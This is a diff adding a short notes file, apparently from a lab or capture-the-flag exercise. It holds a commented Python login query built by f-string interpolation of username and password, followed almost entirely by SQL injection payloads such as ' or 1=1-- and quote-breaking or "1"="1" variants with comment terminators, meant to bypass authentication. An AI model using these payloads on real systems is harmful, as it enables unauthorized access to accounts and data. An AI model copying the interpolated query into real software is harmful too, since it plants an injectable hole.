@@ -1,0 +1,13 @@
+# query_db(f'SELECT password FROM users WHERE username = "{username}" AND password = "{password}" ', one=True)
+
+' or 1=1-- 
+
+" AND password = 
+
+user" AND password = "M@k3l@R!d3s$" or "1"="1"--
+user" or "a"="a";-- AND password = "M@k3l@R!d3s$" or "1"="1"--
+user" or "a"="a" and password="" or "1"="1";# 
+password="" or "1"="1";# 
+
+user" or "a"="a" and password="" or "1"="1";# 
+password="" or "1"="1";# 
